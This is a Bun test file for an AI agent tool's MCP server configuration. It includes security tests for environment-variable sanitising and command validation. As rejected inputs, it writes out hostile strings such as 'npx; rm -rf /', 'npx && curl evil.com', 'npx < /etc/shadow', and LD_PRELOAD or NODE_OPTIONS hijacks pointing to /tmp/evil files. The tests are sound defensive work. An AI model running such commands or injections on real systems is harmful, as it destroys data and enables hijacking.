import { describe, it, expect, beforeAll, afterAll } from 'bun:test'
import { mkdir, rm } from 'fs/promises'
import { join } from 'path'

const MCP_DIR = join(process.cwd(), '.deepseek')
const MCP_PATH = join(MCP_DIR, 'mcp.json')

describe('MCP config', () => {
  it('loadMcpTools returns empty tools when no mcp.json exists', async () => {
    // Ensure no mcp.json
    await rm(MCP_PATH, { force: true })
    const { loadMcpTools } = await import('../src/agent/mcp.js')
    const result = await loadMcpTools()
    expect(result.tools).toBeArray()
    expect(result.tools.length).toBe(0)
  })

  it('loadMcpTools returns empty tools for empty servers config', async () => {
    await mkdir(MCP_DIR, { recursive: true })
    await Bun.write(MCP_PATH, JSON.stringify({ servers: {} }))
    // Re-import to get fresh module
    const { loadMcpTools } = await import('../src/agent/mcp.js')
    const result = await loadMcpTools()
    expect(result.tools).toBeArray()
    expect(result.tools.length).toBe(0)
    await rm(MCP_PATH, { force: true })
  })

  it('loadMcpTools returns errors array', async () => {
    await rm(MCP_PATH, { force: true })
    const { loadMcpTools } = await import('../src/agent/mcp.js')
    const result = await loadMcpTools()
    expect(result.errors).toBeArray()
  })
})

// =============================================================================
// Testes de Segurança MCP — RED Phase (TDD)
// As funções abaixo ainda não existem em src/agent/mcp.ts.
// Estes testes DEVEM FALHAR até que a implementação seja feita.
// =============================================================================

describe('MCP security', () => {
  // ---------------------------------------------------------------------------
  // sanitizeMcpEnv
  // ---------------------------------------------------------------------------
  describe('sanitizeMcpEnv', () => {
    it('should block overwrite of PATH', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { PATH: '/usr/bin:/bin' }
      const override = { PATH: '/tmp/malicious' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.PATH).toBe('/usr/bin:/bin')
    })

    it('should block overwrite of LD_PRELOAD', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { LD_PRELOAD: '' }
      const override = { LD_PRELOAD: '/tmp/evil.so' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.LD_PRELOAD).toBe('')
    })

    it('should block overwrite of LD_LIBRARY_PATH', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { LD_LIBRARY_PATH: '/usr/lib' }
      const override = { LD_LIBRARY_PATH: '/tmp/evil' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.LD_LIBRARY_PATH).toBe('/usr/lib')
    })

    it('should block overwrite of DYLD_INSERT_LIBRARIES', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { DYLD_INSERT_LIBRARIES: '' }
      const override = { DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.DYLD_INSERT_LIBRARIES).toBe('')
    })

    it('should block overwrite of HOME', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { HOME: '/home/user' }
      const override = { HOME: '/tmp/fake-home' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.HOME).toBe('/home/user')
    })

    it('should block overwrite of USER', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { USER: 'marcelo' }
      const override = { USER: 'root' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.USER).toBe('marcelo')
    })

    it('should block overwrite of SHELL', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { SHELL: '/bin/bash' }
      const override = { SHELL: '/tmp/evil-shell' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.SHELL).toBe('/bin/bash')
    })

    it('should block overwrite of PYTHONPATH', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { PYTHONPATH: '/usr/lib/python3' }
      const override = { PYTHONPATH: '/tmp/evil-py' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.PYTHONPATH).toBe('/usr/lib/python3')
    })

    it('should block overwrite of NODE_OPTIONS', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { NODE_OPTIONS: '' }
      const override = { NODE_OPTIONS: '--require /tmp/evil.js' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.NODE_OPTIONS).toBe('')
    })

    it('should allow custom non-critical var MY_TOKEN', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = {}
      const override = { MY_TOKEN: 'abc123' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.MY_TOKEN).toBe('abc123')
    })

    it('should allow custom non-critical var API_KEY', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = {}
      const override = { API_KEY: 'secret-value' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.API_KEY).toBe('secret-value')
    })

    it('should return base unchanged when override is empty object', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { PATH: '/usr/bin', MY_VAR: 'hello' }
      const result = sanitizeMcpEnv(base, {})
      expect(result).toEqual({ PATH: '/usr/bin', MY_VAR: 'hello' })
    })

    it('should not inject critical var from override when absent from base', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      // PATH não está no base — override não deve conseguir injetá-lo
      const base = { MY_VAR: 'hello' }
      const override = { PATH: '/tmp/malicious', MY_VAR: 'overridden' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.PATH).toBeUndefined()
      // MY_VAR não é crítica, pode ser sobrescrita normalmente
      expect(result.MY_VAR).toBe('overridden')
    })
  })

  // ---------------------------------------------------------------------------
  // validateMcpCommand
  // ---------------------------------------------------------------------------
  describe('validateMcpCommand', () => {
    it('should throw when command is empty string', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('')).toThrow()
    })

    it('should throw when command contains path traversal ../', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('../evil-binary')).toThrow()
    })

    it('should throw when command contains path traversal ..\\', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('..\\evil-binary')).toThrow()
    })

    it('should throw when command contains semicolon injection', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx; rm -rf /')).toThrow()
    })

    it('should throw when command contains && injection', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx && curl evil.com')).toThrow()
    })

    it('should throw when command contains || injection', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx || evil')).toThrow()
    })

    it('should throw when command contains pipe | injection', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx | sh')).toThrow()
    })

    it('should throw when command contains backtick injection', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx `evil`')).toThrow()
    })

    it('should throw when command contains $() subshell injection', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx $(evil)')).toThrow()
    })

    it('should not throw for valid command "npx"', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx')).not.toThrow()
    })

    it('should not throw for valid command "python3"', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('python3')).not.toThrow()
    })

    it('should not throw for valid absolute path "/usr/bin/node"', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('/usr/bin/node')).not.toThrow()
    })

    it('should not throw for valid relative path "./my-mcp-server"', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('./my-mcp-server')).not.toThrow()
    })
  })

  // ---------------------------------------------------------------------------
  // Novos testes — Code Review fixes
  // ---------------------------------------------------------------------------
  describe('validateMcpCommand — redirect operators', () => {
    it('validateMcpCommand rejects redirect operators', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('npx > /etc/evil')).toThrow()
      expect(() => validateMcpCommand('npx >> /etc/evil')).toThrow()
      expect(() => validateMcpCommand('npx < /etc/shadow')).toThrow()
      expect(() => validateMcpCommand('npx << EOF')).toThrow()
    })
  })

  describe('validateMcpCommand — whitespace-only', () => {
    it('validateMcpCommand rejects whitespace-only command', async () => {
      const { validateMcpCommand } = await import('../src/agent/mcp.js')
      expect(() => validateMcpCommand('   ')).toThrow()
      expect(() => validateMcpCommand('\t')).toThrow()
    })
  })

  describe('sanitizeMcpEnv — new critical vars', () => {
    it('sanitizeMcpEnv blocks NODE_PATH, BUN_INSTALL and DYLD_LIBRARY_PATH', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      const base = { NODE_PATH: '/safe', BUN_INSTALL: '/safe', DYLD_LIBRARY_PATH: '/safe', MY_VAR: 'ok' }
      const override = { NODE_PATH: '/evil', BUN_INSTALL: '/evil', DYLD_LIBRARY_PATH: '/evil', MY_VAR: 'changed' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.NODE_PATH).toBe('/safe')
      expect(result.BUN_INSTALL).toBe('/safe')
      expect(result.DYLD_LIBRARY_PATH).toBe('/safe')
      expect(result.MY_VAR).toBe('changed')
    })
  })

  describe('sanitizeMcpEnv — undefined filtering', () => {
    it('sanitizeMcpEnv does not include undefined values from base', async () => {
      const { sanitizeMcpEnv } = await import('../src/agent/mcp.js')
      // Simula process.env com valores undefined filtrados
      const base = { DEFINED: 'value', MY_TOKEN: 'abc' }
      const override = { MY_TOKEN: 'evil' }
      const result = sanitizeMcpEnv(base, override)
      expect(result.MY_TOKEN).toBe('evil') // não é crítica, pode ser sobrescrita
      expect(result.DEFINED).toBe('value')
    })
  })

  // ---------------------------------------------------------------------------
  // buildMcpLoadEvent
  // ---------------------------------------------------------------------------
  describe('buildMcpLoadEvent', () => {
    it('should return event with type "mcp_server_load"', async () => {
      const { buildMcpLoadEvent } = await import('../src/agent/mcp.js')
      const event = buildMcpLoadEvent('my-server', 'stdio')
      expect(event.type).toBe('mcp_server_load')
    })

    it('should contain the serverName passed as argument', async () => {
      const { buildMcpLoadEvent } = await import('../src/agent/mcp.js')
      const event = buildMcpLoadEvent('filesystem-server', 'stdio')
      expect((event as { serverName: string }).serverName).toBe('filesystem-server')
    })

    it('should contain the transport passed as argument', async () => {
      const { buildMcpLoadEvent } = await import('../src/agent/mcp.js')
      const event = buildMcpLoadEvent('http-server', 'http')
      expect((event as { transport: string }).transport).toBe('http')
    })

    it('should work for stdio transport', async () => {
      const { buildMcpLoadEvent } = await import('../src/agent/mcp.js')
      const event = buildMcpLoadEvent('stdio-server', 'stdio')
      expect((event as { transport: string }).transport).toBe('stdio')
    })

    it('should work for http transport', async () => {
      const { buildMcpLoadEvent } = await import('../src/agent/mcp.js')
      const event = buildMcpLoadEvent('remote-server', 'http')
      expect((event as { serverName: string }).serverName).toBe('remote-server')
    })
  })
})
